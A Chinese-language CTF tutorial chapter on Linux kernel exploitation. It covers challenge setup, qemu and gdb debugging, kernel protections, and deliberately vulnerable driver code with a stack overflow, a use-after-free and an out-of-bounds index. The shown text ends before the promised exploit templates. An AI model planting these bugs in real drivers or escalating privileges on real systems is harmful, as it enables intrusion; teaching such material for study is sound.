# 12 内核 PWN 入门

> 本章面向已有用户态 PWN 基础（栈溢出、ROP、ret2libc 已熟练）的读者，定位是"用户态 → 内核态"的桥梁。学完本章你应当能够：独立搭起内核调试环境、看懂题目包与启动脚本、判断 KASLR/SMEP/SMAP/KPTI 开关、识别常见漏洞驱动模式，并掌握 ret2usr、内核 ROP（含 KPTI 绕过）、modprobe_path 三条经典提权路线的完整 exploit 写法。

## 本章速览

| 小节 | 主题 | 关键词 |
|:--|:--|:--|
| 12.1 | 内核 PWN 题形态 | bzImage / rootfs.cpio / start.sh / *.ko / qemu 参数 |
| 12.2 | 环境搭建实操 | cpio 解包重打包 / extract-vmlinux / gdb 调内核 |
| 12.3 | 内核保护机制 | KASLR / SMEP / SMAP / KPTI / CFI |
| 12.4 | 漏洞驱动模式 | file_operations / ioctl / 栈溢出 / UAF / OOB / 竞争条件 |
| 12.5 | 提权原理与手段 | cred / ret2usr / 内核 ROP / KPTI trampoline / modprobe_path / core_pattern |
| 12.6 | 完整 exploit 模板 | ret2usr 模板 / 内核 ROP 模板 / modprobe_path 模板 |
| 12.7 | 典型例题 | 3 道构造情境题（无保护 / SMEP+KPTI / modprobe_path） |
| 12.8 | 学习路径建议 | 题源 / 进阶方向（msg_msg、pipe_buffer、io_uring） |
| 12.9 | 常见坑 | qemu 版本 / 地址随机 / 符号加载 / cpio 权限 / vermagic |
| 12.10 | 本章检查清单 | 出门前自查 |

内核 PWN 的整体画面先看这张图，后文所有内容都在这张图里：

```
        用户态（你的 exp 进程, uid=1000）
        │  open("/dev/vuln") → write() / ioctl()
        ▼  系统调用陷入内核（swapgs、切到内核栈）
┌──────────────────────────────────────────────────┐
│  内核态（CPL=0，ring 0）                          │
│  漏洞驱动 vuln.ko 的 file_operations 回调：       │
│   ├─ 栈溢出   → 内核栈被覆写 → ret2usr / 内核 ROP │
│   ├─ UAF/OOB  → 堆对象被破坏 → 劫持函数指针       │
│   └─ 竞争条件 → TOCTOU → 类型混淆 / UAF           │
│  利用成功 → commit_creds(root cred) 或改内核数据  │
└──────────────────────────────────────────────────┘
        │  swapgs + iretq（五元组）回到用户态
        ▼
        get_shell() 或 cat flag   （此时 uid=0）
```

---

## 12.1 内核 PWN 题形态

### 12.1.1 与用户态 PWN 的思维差异

内核 PWN 不是"更难的栈题"，而是**换了攻击面和目标**：

| 维度 | 用户态 PWN | 内核 PWN |
|:--|:--|:--|
| 最终目标 | 劫持控制流 getshell（拿到 euid=0 的 shell） | **提权**（把当前进程 cred 换成 root）或**改内核数据**（modprobe_path 等），再读 flag |
| 分析对象 | 用户态二进制 + libc | 内核镜像 vmlinux（从 bzImage 提取）+ 漏洞模块 *.ko |
| 漏洞入口 | main、菜单逻辑、read/write 输入 | 字符设备的 `open/read/write/ioctl` 回调 |
| 溢出位置 | 用户栈（几 MB） | **内核栈**（每进程仅 16KB，溢出即污染关键数据，失败常直接 panic） |
| 返回现场 | 函数正常返回即可 | 必须构造 iretq 五元组（rip/cs/rflags/rsp/ss）+ swapgs |
| 调试方式 | gdb 本地附加 / 远程 | qemu 起 gdbserver（-s -S），gdb `target remote` |
| 信息泄露 | libc 基址、栈地址、canary | 内核基址（KASLR 绕过）、cred 地址、模块加载地址 |
| 失败代价 | 段错误，重连即可 | 内核 oops / panic，整机重启，本地远程都重来 |

一句话总结：**用户态的目标是"执行我的代码"，内核态的目标是"让内核替我把权限改成 root"**。控制流劫持只是手段，不是目的——很多内核 exploit 干脆不打控制流，纯靠改数据（见 12.5.6 modprobe_path）。

### 12.1.2 题目包结构

一道典型的内核 PWN 题分发下来通常长这样：

```
babykernel/
├── bzImage          # 压缩后的 Linux 内核镜像（big zImage）
├── rootfs.cpio      # initramfs 根文件系统（可能带 gzip 压缩，文件名也可能是 rootfs.cpio.gz）
├── start.sh         # qemu 启动脚本 —— 最重要的信息源，先读它！
├── vuln.ko          # 漏洞内核模块（有时已在 rootfs.cpio 内部）
└── flag             # 本地通常没有，只有远程服务器上才有
```

各文件的定位：

- **bzImage**：不能直接给 IDA/gdb 用，需要先"解压"出真正的 ELF 内核 **vmlinux**（见 12.2.3）。vmlinux 里有全部内核符号（`commit_creds`、`prepare_kernel_cred` 等）和 ROP gadget。
- **rootfs.cpio**：cpio 格式的根文件系统，解开后是 `init` 脚本 + busybox + 漏洞驱动 `/vuln.ko` + `/dev/...` 设备节点等。**exploit 也从这里塞进去**。
- **start.sh**：告诉我们内核版本线索、开启了哪些保护（12.1.4）。本地调试时可以自行改它（加 `nokaslr`、`-s -S`）。
- **vuln.ko**：漏洞本体。用 `objdump -d vuln.ko`、IDA、Ghidra 静态分析；部分题目不单独给 .ko，需要从 rootfs 里解出来。

### 12.1.3 start.sh 逐行解读

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -append "console=ttyS0 kaslr smep smap" \
    -cpu qemu64,+smep,+smap \
    -nographic \
    -no-reboot
```

| 参数 | 含义 | PWN 视角 |
|:--|:--|:--|
| `-m 128M` | 虚拟机内存大小 | 内存太小塞不下大 exp 时可以本地调大 |
| `-kernel ./bzImage` | 指定内核镜像 | 内核本体 |
| `-initrd ./rootfs.cpio` | 指定初始内存文件系统（initramfs） | 内核启动后解包为根文件系统并执行其中 `/init` |
| `-append "..."` | **内核命令行**，传给内核自己的参数 | 保护机制的开关大多在这里（12.1.4） |
| `-cpu qemu64,+smep,+smap` | CPU 型号及特性开关 | **硬件侧**开关：SMEP/SMAP 需要 CPU 支持才可能开启 |
| `-nographic` | 无图形界面，把串口接到标准输入输出 | 所以我们在终端里直接看到内核 log、拿到 shell |
| `-no-reboot` | 内核崩溃后不自动重启 | panic 后 qemu 退出，配合调试 |

其他常见参数：

| 参数 | 含义 |
|:--|:--|
| `-s` | 等价于 `-gdb tcp::1234`，在 1234 端口开 gdbserver |
| `-S` | 启动后立刻冻结 CPU，等 gdb 接管（常与 `-s` 连用） |
| `-monitor ...` | qemu monitor 的位置（`-monitor none` 或 unix socket） |
| `-L /usr/share/qemu` 等 | BIOS/固件搜索路径，一般不用管 |
| `-serial mon:stdio` | 串口重定向（`-nographic` 的等价拆开写法） |

> **qemu 版本差异坑**：旧版 qemu 不认某些 CPU 特性（如 `+smap`），报错 "feature smap not supported"。升级 qemu 或换 CPU 型号（`kvm64`、`Skylake-Client` 等）。

### 12.1.4 -append 内核命令行参数详解（保护判据）

`-append` 里的参数直接决定我们面对什么防御体系：

| 参数 | 含义 | 反向开关 |
|:--|:--|:--|
| `kaslr` / 默认 | 内核地址空间布局随机化（编译期 CONFIG_RANDOMIZE_BASE=y 时默认开） | `nokaslr` |
| `smep` / CPU 支持 | 内核态禁止**执行**用户态页（Supervisor Mode Execution Prevention） | `nosmep` |
| `smap` / CPU 支持 | 内核态禁止**读写**用户态页（Supervisor Mode Access Prevention） | `nosmap` |
| `pti=on` / 硬件易受 Meltdown 攻击时默认 | 内核页表隔离（Kernel Page Table Isolation） | `nopti` 或 `pti=off` |
| `console=ttyS0` | 控制台输出到串口 0 | —— |
| `quiet` | 抑制启动 log | 去掉它可以看到更多内核信息 |
| `panic=10` 等 | panic 后的行为（秒数后重启/不重启） | —— |

**快速判据口诀**（做题时 10 秒内过一遍 start.sh）：

1. `-append` 里出现 `nosmep`/`nosmap`/`nokaslr`/`nopti` → 对应保护**关闭**，是放水信号；
2. 什么都没写 → 保护取决于 **CPU 型号**（`-cpu` 行）和内核编译选项：`qemu64`/`kvm64` 默认不带 SMEP/SMAP，除非 `+smep,+smap`；KPTI 在非 Meltdown 模拟 CPU 上默认**关**（qemu64 会伪装成不受影响的 CPU）；
3. `kaslr`/`smep`/`smap` 字样显式出现 → 开启；
4. 终极确认：进虚拟机后 `cat /proc/cmdline` 看真实命令行，`dmesg | grep -i "smep\|smap\|pti\|kaslr"`，或在 gdb 里直接 `info registers cr4`（第 20 位 SMEP、21 位 SMAP、22 位 PCID…）。

### 12.1.5 从 getshell 到提权：目标的转变

用户态拿到 shell 的意义是"以运行用户身份执行命令"；而内核题的进程本来就是个普通 uid（init 里通常用 `setuidgid 1000` 把 shell 降到 uid=1000），`cat /flag` 会失败（flag 常是 `chmod 400 root` 所有）。所以内核 exploit 的成功标准是：

- **路线 A（控制流劫持 → cred 替换）**：在内核态执行 `commit_creds(prepare_kernel_cred(0))`，当前进程当场变成 uid=0，然后正常返回用户态起 shell。这是 12.5 的大部分内容。
- **路线 B（数据攻击）**：不改 cred，改内核全局数据，借内核自己的机制**间接**以 root 执行我们的脚本，比如覆写 `modprobe_path`（12.5.6）。不需要任何控制流劫持，返回用户态的事都不用管。

---

## 12.2 环境搭建实操

### 12.2.1 工具清单

```bash
# Debian/Ubuntu 系
sudo apt install qemu-system-x86 busybox-static cpio gdb
pip install pwntools ROPgadget     # ROPgadget 也可用来给 vmlinux 找 gadget
# 可选：
sudo apt install musl-tools         # 用 musl 静态编译更小的 exp
git clone https://github.com/marin-m/vmlinux-to-elf   # 从 bzImage 重建带符号 ELF，非常好用
```

`busybox-static` 提供静态链接的 busybox，用来自己构造 rootfs；`cpio` 是打包/解包 initramfs 的核心工具。

### 12.2.2 解包与重打包 initramfs

**解包：**

```bash
file rootfs.cpio          # 第一步先看格式！
# → "gzip compressed data" 说明是 gzip 压缩的 cpio：
gzip -dc rootfs.cpio > rootfs.cpio.raw
# → "ASCII cpio archive" 说明未压缩，直接用

mkdir rootfs && cd rootfs
cpio -idmv < ../rootfs.cpio.raw   # i=解包 d=建目录 m=保留时间 v=显示文件
```

> `-idmv` 中的 `d` 很关键，initramfs 里的设备节点/深层目录需要 cpio 自动创建路径。

解包后典型内容：

```
rootfs/
├── init            # PID 1，内核启动后第一个执行的脚本 —— 环境的一切都在这里
├── bin/ sbin/ usr/ # busybox 等
├── vuln.ko         # 漏洞驱动（有的题目放这里而不是单独给）
├── dev/ etc/ ...
└── flag            # 本地可能是假 flag
```

**看 init（必看！）：**

```sh
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev

insmod /vuln.ko                    # 加载漏洞驱动
mknod /dev/vuln c 248 0 2>/dev/null # 有的题目手动建设备节点（主设备号看 dmesg）
chmod 666 /dev/vuln                # 给普通用户访问权

echo "flag{fake_flag_local}" > /flag
chmod 400 /flag                    # root 可读 —— 提权后才拿得到

# 用 busybox 把 shell 降到 uid=1000（普通用户），这就是我们 exp 的运行身份
setsid cttyhack setuidgid 1000 /bin/sh

poweroff -d 0 -f
```

**本地调试改造 init 的常用技巧：**

```sh
# 原来的降权行注释掉 → 直接以 root 起 shell，方便看 /proc/kallsyms、用 dmesg
# setsid cttyhack setuidgid 1000 /bin/sh
/bin/sh

# 想模拟远程就把 exp 放进来、以 uid 1000 跑：
/home/exp    # 手动运行验证
```

**放入 exploit 并重打包：**

```bash
gcc -static -o exp exp.c -w        # 必须静态链接！rootfs 里没有 libc
strip exp                          # 减小体积（initramfs 在内存里，越小越好）

cp exp rootfs/home/exp
cd rootfs
# 重打包：--owner=root:root 保证属主正确；newc 是内核要求的 cpio 格式
find . -print0 | cpio --null -ov --format=newc --owner=root:root 2>/dev/null | gzip -9 > ../new_rootfs.cpio
```

然后改 start.sh 里 `-initrd ./new_rootfs.cpio` 启动即可。内核会自动识别 gzip 压缩，压不压都行。

> **权限坑**：改过 init 后务必 `chmod +x init`，否则内核找不到根文件系统里的 init，报 "Failed to execute /init" 直接 kernel panic（详见 12.9）。

### 12.2.3 从 bzImage 提取 vmlinux

bzImage 是"压缩过的内核 + 自解压 stub"，静态分析必须先得到里面未压缩的 ELF vmlinux：

```bash
# 方法一：内核源码自带的官方脚本（scripts/extract-vmlinux，网上随处可下）
./extract-vmlinux bzImage > vmlinux
file vmlinux
# → "ELF 64-bit LSB executable, x86-64, ... statically linked" 即成功

# 方法二：手动找解压流（理解原理）
binwalk bzImage               # 找 gzip(1F 8B 08)/xz(FD 37 7A 58 5A)/lzma 魔数的偏移
dd if=bzImage bs=1 skip=<偏移> 2>/dev/null | gunzip > vmlinux

# 方法三：vmlinux-to-elf，一步到位重建带完整符号表的 ELF（bzImage 符号表被剥时尤其有用）
vmlinux-to-elf bzImage vmlinux.elf
```

拿到 vmlinux 之后：

```bash
checksec vmlinux                       # 看编译选项痕迹
readelf -s vmlinux | grep -E "commit_creds|prepare_kernel_cred|init_cred|modprobe_path"
ROPgadget --binary vmlinux > gadgets.txt   # 全量 gadget，后面 ROP 用
```

> 注意：vmlinux 里的符号地址是 **KASLR 关闭时的地址**（链接基址通常 `0xffffffff81000000`）。开启 KASLR 的题，运行时真实地址 = 链接地址 + 随机偏移，需要泄露（12.3.1）。

### 12.2.4 用 gdb 调试内核

**第一层：调试内核本体。**

```bash
# 终端 1：-s 开 gdbserver，-S 让 CPU 启动即暂停
qemu-system-x86_64 -m 128M -kernel bzImage -initrd new_rootfs.cpio \
    -append "console=ttyS0 nokaslr" -nographic -no-reboot -s -S

# 终端 2：加载 vmlinux 符号并连接
gdb ./vmlinux \
    -ex "target remote :1234" \
    -ex "b start_kernel" \
    -ex "c"
```

连上之后 gdb 的常规操作全部可用：`b *0xffffffff8109c8e0`、`x/10i $rip`、`p/x $cr4`（看 SMEP/SMAP 位）、`info registers`、`x/20gx $rsp`（看内核栈）。

**第二层：调试漏洞模块（.ko）。**

模块是运行时动态加载的，gdb 不知道它的符号。流程：

```bash
# ① 虚拟机内（以 root）看模块加载地址：
cat /proc/modules                     # 或 lsmod，得到 vuln 0xffffffffc0000000 ...
cat /sys/module/vuln/sections/.text  # 精确的 .text 段地址（gdb add-symbol-file 需要）

# ② 宿主机 gdb 里把模块符号挂上去：
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000 -s .data 0xffffffffc0002000 ...
# 简化用法（大多数版本 .text 地址就够用）：
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b *0xffffffffc0000137      # 或直接 b vuln_ioctl（有符号后）
(gdb) c
```

**时序技巧：模块还没加载时怎么断？**

```
(gdb) b do_init_module      # 内核加载任何模块都会经过这里，断下后模块已被加载
(gdb) c                     # 虚拟机里 init 执行 insmod 后 gdb 停住
(gdb) cat /proc/modules     # （另开终端进虚拟机看）或 p 模块地址
(gdb) add-symbol-file vuln.ko <地址>   # 现在挂符号，再断 vuln_ioctl
```

**pwntools 启动脚本（通用，三个例题都用它）：**

```python
#!/usr/bin/env python3
# boot.py —— pwntools 交互脚本：打包 rootfs → 启动 qemu → 进入交互
# 用法：python3 boot.py            # 直接跑
#       python3 boot.py --gdb      # 以 -s -S 启动，供 gdb remote 连接
from pwn import *                     # pwntools 主库
import argparse, os, subprocess       # 参数解析/文件操作/调打包命令

context.log_level = 'info'            # pwntools 日志级别

DIR  = './rootfs'                     # 解包后的 rootfs 目录
CPIO = './new_rootfs.cpio'            # 重打包输出
EXP  = './exp'                        # 编译好的静态 exp

def repack():                                                     # 把 exp 打进 initramfs
    os.system(f'cp {EXP} {DIR}/home/exp && chmod +x {DIR}/home/exp')   # 放入 exp 并加执行位
    os.system(f'cd {DIR} && find . -print0 | '                    # 从 rootfs 目录内打包
              f'cpio --null -o --format=newc --owner=root:root '  # newc 格式 + root 属主
              f'2>/dev/null | gzip -9 > ../{os.path.basename(CPIO)}')  # 压缩输出

def boot(debug=False):                                            # 启动 qemu
    args = ['qemu-system-x86_64',                                 # qemu 主程序
            '-m', '128M',                                         # 内存
            '-kernel', './bzImage',                               # 内核
            '-initrd', CPIO,                                      # 根文件系统
            '-append', 'console=ttyS0 nokaslr',                   # ← 按题目要求增删保护参数
            '-nographic', '-no-reboot']                           # 串口交互 + 崩溃不重启
    if debug:                                                     # 调试模式
        args += ['-s', '-S']                                      # gdbserver 1234 + 启动即暂停
    io = process(args)                                            # 以子进程方式拉起 qemu
    io.interactive()                                              # 把终端交给用户（看到内核 log/shell）

if __name__ == '__main__':                                        # 入口
    ap = argparse.ArgumentParser()                                # 参数解析器
    ap.add_argument('--gdb', action='store_true')                 # --gdb 开关
    a = ap.parse_args()                                           # 解析
    repack()                                                      # 先打包
    boot(a.gdb)                                                   # 再启动
```

> exp 也可以不塞进 rootfs：在虚拟机里用 busybox 自带的 `wget`（若 init 配了网络）或 `base64 -d` 粘贴传入。塞 rootfs 是最稳的。

### 12.2.5 虚拟机内常用信息收集命令

进虚拟机后第一件事是把情报摸清：

```bash
cat /proc/cmdline                    # 确认真实启动参数：kaslr? smep? pti?
cat /proc/version                    # 内核版本（决定 prepare_kernel_cred 等行为、找对应源码）
cat /proc/cpuinfo | grep -o "smep\|smap"   # CPU 是否暴露 SMEP/SMAP

cat /proc/kallsyms | grep commit_creds   # 全部内核符号。注意：uid!=0 时地址显示 0！
# → 读不到的解法：① 本地改 init 以 root 起 shell；② 看 kptr_restrict/dmesg_restrict：
cat /proc/sys/kernel/kptr_restrict       # 为 1/2 时普通用户读内核指针都会被屏蔽
cat /proc/sys/kernel/dmesg_restrict      # 为 1 时普通用户 dmesg 不可用

dmesg | tail -30                     # 驱动的 printk 都在这，洞的线索（老内核 dmesg 还会泄指针）
lsmod                                # 已加载模块及其基址 → vuln 模块加载地址（配合 add-symbol-file）
cat /sys/module/vuln/sections/.text  # 模块 .text 精确地址（root）
cat /proc/iomem                      # 内核代码段映射（老版本可看 Kernel code 范围，间接泄基址）
```

> `/proc/kallsyms` 是内核 PWN 的"地图"：`commit_creds`、`prepare_kernel_cred`、`modprobe_path`、`swapgs_restore_regs_and_return_to_usermode` 的运行时地址全在这里，KASLR 开启时它给的就是**随机化后的真实地址**。能以 root 读它， exploitation 难度直降一级；远程题不给 root，就需要用漏洞泄露（详见 12.3.1）。

---
## 12.3 内核保护机制

内核态的保护与用户态一一同构，但作用域和效果不同。逐个看原理与影响。

### 12.3.1 KASLR —— 内核版的 PIE

**原理**：内核镜像不再是固定基址 `0xffffffff81000000` 加载，而是启动时整体加上一个随机偏移（页对齐，典型偏移范围 1GB 内取随机页），vmlinux 里看到的静态地址全部失效。与用户态 PIE 完全同类。

```
无 KASLR                              有 KASLR
0xffffffff81000000 ─┬─ text          0xffffffff81000000
                    ├─ data           │
0xffffffff81a00000 ─┴─ ...            │  +0x???00000（启动时随机的页对齐偏移）
                                      ▼
                                   0xffffffffa2400000 ─┬─ text
                                   0xffffffffab400000 ─┴─ data
```

**泄露内核指针的常见途径**：

1. **/proc/kallsyms**：root 可读全部真实符号地址；`kptr_restrict=0` 时普通用户也可读。
2. **dmesg**：`dmesg_restrict=0` 时普通用户可读；老内核驱动 printk 会直接打印指针（`%p` 在 5.x 后默认 hash 了，`%px` 才是裸指针）。
3. **漏洞本身**：OOB 读到内核栈/堆上残留的函数指针、结构体指针（内核栈上几乎必有 `__ret_from_fork`、`save_stack_trace` 留下的 text 地址）。
4. **/proc/iomem、/proc/modules、sysfs** 等接口的旧版本泄密。
5. 侧信道（Prefetch、EntryBLEED 等，进阶）。

**本地调试建议**：改 start.sh 加 `nokaslr`，等利用链在固定地址上调通，再考虑 KASLR 泄露步骤（很多入门题干脆 nokaslr，或 root 权限读 kallsyms 等价于绕过了 KASLR）。

### 12.3.2 SMEP —— 内核态不许执行用户态代码

**原理**：页表项（PTE）有一位 **U/S**（user/supervisor）标记页属于用户还是内核。SMEP 开启后（CR4 第 20 位），**CPL=0 的代码执行 U/S=1 的页会触发 page fault**（oops）。它就是 NX 的镜像对称物：

```
页表（每个 PTE 带属性位）：
  ┌───────────────────────────────────┐
  │ 用户页   U/S=1 │ NX 位决定可执行否 │   ← NX：CPL=3 不可执行内核数据页
  │ 内核页   U/S=0 │ 不可执行位 NX=1   │   ← NX：CPL=0 不可执行数据页
  └───────────────────────────────────┘

无 SMEP：CPL=0（内核态）可以跳去执行 U/S=1 的页 → ret2usr 可行
有 SMEP：CPL=0 执行用户页 → #PF → oops → ret2usr 被封死，只能内核 ROP
```

**对比 NX**：NX 管的是"用户态数据页不可执行"；SMEP 管的是"内核态不许执行**用户态的任何页**"。NX 挡用户态攻击者的 shellcode，SMEP 挡内核 exploit 直接跳回用户态的提权函数。

**绕过思路预告**：SMEP 下不再跳用户态代码，改为在**内核栈上布置 ROP 链**，用 vmlinux 里的内核 gadget 拼出 `commit_creds(prepare_kernel_cred(0))`（12.5.4）。另一个经典绕法是 `ret2dir`（physmap：内核有份对用户内存的映射，把 shellcode 放进 physmap 再跳过去，较老内核可用）。

### 12.3.3 SMAP —— 内核态不许访问用户态数据

**原理**：SMEP 的姊妹版（CR4 第 21 位）：CPL=0 时**读写** U/S=1 的页同样触发 page fault。内核合法访问用户内存必须显式用 `stac/clac` 指令临时放行（`copy_from_user/copy_to_user` 内部就是这么做的），所以正常系统调用不受影响。

**对 exploit 的影响**：

- 没了 SMAP：可以让内核 ROP 链中直接 `pop rdi; ret` 把**用户态地址**塞给函数（比如把伪造的 fake cred 放在用户态，让内核当真 cred 用）；甚至把整个 payload 结构体放用户态内存让内核去取。
- 有 SMAP：ROP 链中不能引用任何用户态内存地址——所有数据（cred、文件名、argv 数组等）都得想办法放进内核内存，利用难度上升。

### 12.3.4 KPTI —— 内核页表隔离

**原理**：Meltdown 漏洞的官方缓解。开启后**用户态和内核态各用一套页表**：

```
无 KPTI：一套页表两态共用
  内核态视角：内核全部映射 + 用户全部映射
  用户态视角：内核全部映射（只是权限挡着）→ Meltdown 能越权读

有 KPTI：CR3 切换
  ┌ 内核 CR3：完整页表（内核全部 + 用户全部）
  └ 用户 CR3：仅保留极小部分内核映射（cpu_entry_area：系统调用入口、TSS 等）
              内核代码/栈在用户 CR3 下根本不存在 → Meltdown 无从读起
```

**对 exploit 的影响**（重点）：返回用户态不能只靠裸 `iretq`——iretq 后 CR3 还是内核页表，而我们的用户态代码在用户页表里；虽然地址上 iretq 还是能跳回（用户映射在内核 CR3 里也有），但 GS/进程上下文不对、且新内核路径要求按固定流程切换 CR3 + swapgs，否则切回来时页表错乱直接崩。**正确姿势是借内核现成的返回路径：`swapgs_restore_regs_and_return_to_usermode`**（12.5.5 详讲）。

### 12.3.5 CFI —— 控制流完整性（概念）

CONFIG_CFI_CLANG（Google 主推）等实现会给间接调用加白名单校验：函数指针只能指向**签名匹配**的函数（比如 `file_operations` 里的函数只能跳到其他 `file_operations` 成员），UAF 把函数指针改成任意 gadget 会被拦。目前 CTF 内核题大多未开，做题时 `checksec`/配置里确认一下即可，遇到时思路转向数据攻击或找同类函数。

### 12.3.6 保护判据速查表

| 保护 | 看哪里 | 开启时的典型现象 |
|:--|:--|:--|
| KASLR | start.sh `-append`；gdb `info symbol` 对不上 vmlinux 地址 | 相同 vmlinux，每次启动符号地址不同 |
| SMEP | `-cpu` 是否 `+smep`、`-append` 是否 `nosmep`；gdb `p/x $cr4 & 0x100000` | ret2usr 跳回用户态函数 → oops `#PF` |
| SMAP | 同上（cr4 第 21 位 `0x200000`） | 内核 ROP 引用用户地址 → oops |
| KPTI | `-append` 是否 `nopti/pti=on`；CPU 是否 Intel 型；`dmesg` 启动 log 有 "Kernel/User page tables isolation: enabled" | iretq 直接回用户态崩；必须走 trampoline |
| kptr 屏蔽 | `cat /proc/sys/kernel/kptr_restrict` | 普通用户看 kallsyms 全是 `0000000000000000` |

---

## 12.4 漏洞驱动模式

内核 PWN 的漏洞 99% 藏在**字符设备驱动**的回调函数里。先看骨架，再看四种典型洞型。

### 12.4.1 字符设备、file_operations 与 ioctl 入口

```c
// vuln.c —— 教学用驱动骨架（编译为 vuln.ko）
#include <linux/module.h>       // 模块宏
#include <linux/kernel.h>
#include <linux/fs.h>           // file_operations
#include <linux/uaccess.h>      // copy_from_user / copy_to_user
#include <linux/init.h>

static int major;               // 主设备号

static int vuln_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "[vuln] opened\n");            // 调试信息进 dmesg
    return 0;
}

static ssize_t vuln_write(struct file *filp, const char __user *buf,
                          size_t len, loff_t *off) {
    return 0;                                       // 按需实现
}

static long vuln_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    return 0;                                       // 按需实现（命令分发中心）
}

static struct file_operations vuln_fops = {     // 函数指针表：内核的"虚表"
    .owner          = THIS_MODULE,
    .open           = vuln_open,
    .write          = vuln_write,
    .unlocked_ioctl = vuln_ioctl,   // ← CTF 漏洞最常藏的入口
};

static int __init vuln_init(void) {
    major = register_chrdev(0, "vuln", &vuln_fops); // 注册字符设备，返回分配的主设备号
    printk(KERN_INFO "[vuln] major = %d\n", major);
    return 0;
}

static void __exit vuln_exit(void) {
    unregister_chrdev(major, "vuln");               // 注销
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
```

调用链全景：

```
用户进程 exp.c                         内核
────────────────                       ──────────────────────────────────
open("/dev/vuln", O_RDWR)  ────────►  vfs_open → chrdev_open
                                       └─ 查 cdev_map 找到 vuln_fops
ioctl(fd, CMD, arg)        ────────►  sys_ioctl → filp->f_op->unlocked_ioctl
write(fd, buf, len)        ────────►  sys_write → filp->f_op->write(filp, buf, len, off)
                                       └─ 漏洞就在这些回调里
```

> 用户态与内核态之间搬数据只能靠 `copy_from_user/copy_to_user`（它们内部会处理缺页与 SMAP 的 stac/clac）。**看到驱动把用户传来的长度、下标直接用，基本就是洞**。

**模块编译 Makefile**（想本地复现/改编驱动时用）：

```makefile
obj-m += vuln.o
KDIR ?= /lib/modules/$(shell uname -r)/build    # 内核构建目录（需装 headers 或源码）
all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules
clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
```

> vermagic 坑：模块编译时的内核版本字符串必须与题目 bzImage 一致，否则 insmod 报 "Invalid module format"。解法见 12.9。

### 12.4.2 模式一：栈溢出（copy_from_user 长度未验）

**漏洞驱动（简化）**：

```c
static ssize_t vuln_write(struct file *filp, const char __user *buf,
                          size_t len, loff_t *off)
{
    char kernel_buf[0x40];                      // 内核栈上只有 0x40 字节
    printk(KERN_INFO "[vuln] write len=%lu\n", len);
    copy_from_user(kernel_buf, buf, len);       // 漏洞：len 没有和 sizeof(kernel_buf) 比较
    return len;                                 // 用户传多大就拷多大 → 内核栈溢出
}
```

```
内核栈（每进程 16KB，从高往低用）：
   ...               ┌────────────┐
                     │ kernel_buf │ ← 0x40
                     │ ...        │
   溢出方向  ───────► │ 保存的寄存器│
                     │ 返回地址    │ ← copy_from_user 越界后这里被覆盖
                     │ 调用者的栈帧│
                     └────────────┘
```

**用户态利用框架**：

```c
int fd = open("/dev/vuln", O_RDWR);
write(fd, payload, 0x100);      // payload 是精心构造的覆盖序列（ret2usr 或 ROP 链）
// write 返回时内核沿被污染的栈"返回" → 跳到我们安排的地方
```

**要点**：
- 内核栈只有 16KB，溢出太长会踩坏 thread_info / task_struct（老内核）导致 panic，一般覆盖到返回地址再留 iretq 帧即可，不用暴力写满。
- 栈上溢出同样有 "canary 类" 等价物（CONFIG_STACKPROTECTOR 的栈金丝雀也存在于内核），有 canary 时需先泄露。
- 这是最"用户态友好"的洞型：思路与 02/04/07 章完全一致，只是场景搬到内核栈。

### 12.4.3 模式二：堆 UAF（驱动自管理对象）

**漏洞驱动（简化）**：

```c
struct object {
    char data[0x40];
    void (*fn)(void);                   // 函数指针 —— exploit 的天然落点
};

static struct object *g_obj = NULL;     // 驱动全局指针

static long vuln_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case CMD_ALLOC:                                     // 申请
        if (!g_obj) {
            g_obj = kmalloc(sizeof(struct object), GFP_KERNEL);
            g_obj->fn = do_nothing;                     // 初始化函数指针
        }
        break;
    case CMD_FREE:                                      // 释放
        if (g_obj) {
            kfree(g_obj);                               // 漏洞：释放后没有 g_obj = NULL
        }                                               // g_obj 变成悬垂指针（dangling pointer）
        break;
    case CMD_EDIT: {                                    // 编辑（释放后仍可编辑 → UAF 写）
        struct req r;
        if (!g_obj) return -EINVAL;
        copy_from_user(&r, (void __user *)arg, sizeof(r));
        copy_from_user(g_obj->data, r.buf, r.len);      // 操作的是已释放的内存！
        break;
    }
    case CMD_CALL:                                      // 触发调用
        if (g_obj && g_obj->fn)
            g_obj->fn();                                // → 劫持函数指针 = 控制流劫持
        break;
    }
    return 0;
}
```

```
UAF 时间线：
  ALLOC:  g_obj ──► [object: data | fn]      (kmalloc-0x60 缓存)
  FREE :  g_obj ──► [已释放，进了 SLUB freelist，数据还在原地]
  堆喷:   重新 kmalloc 同尺寸的对象占位，内容可控（如另一个驱动的 buf / msg_msg / setxattr）
  EDIT :  写"已释放"对象 = 写新对象 → 覆盖 fn
  CALL :  g_obj->fn() → 跳到提权函数 / ROP
```

**要点**：
- Linux 用 **SLUB 分配器**，kmalloc 按尺寸分缓存（kmalloc-32/64/96/192/512…）。释放的对象按 LIFO 复用，所以"释放后立刻分配同尺寸"几乎必然拿回同一块——这比 glibc malloc 好预测得多。
- 占位（堆喷）手段：用户态可控内核堆分配的常用工具有 `setxattr`（短暂拷贝可控数据）、`msg_msg`（System V 消息）、`sendmsg`/`sk_buff`、`add_key`、pipe buffer 等（12.8 进阶方向）。
- 若驱动把对象指针存进了 `filp->private_data`（每打开一次一份），还能用 `fork`/多线程制造 double free。

### 12.4.4 模式三：越界读写（ioctl 的 index 未查）

**漏洞驱动（简化）**：

```c
static long data[0x100];                // 驱动自己的全局数组

struct request {
    long idx;                           // 用户控制的下标 —— 没有边界检查！
    long val;                           // 写入的值
    long __user *buf;                   // 读取结果回传地址
};

static long vuln_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    struct request r;
    copy_from_user(&r, (void __user *)arg, sizeof(r));
    switch (cmd) {
    case CMD_READ:
        copy_to_user(r.buf, &data[r.idx], sizeof(long));    // OOB 读
        break;
    case CMD_WRITE:
        data[r.idx] = r.val;                                // OOB 写
        break;
    }
    return 0;
}
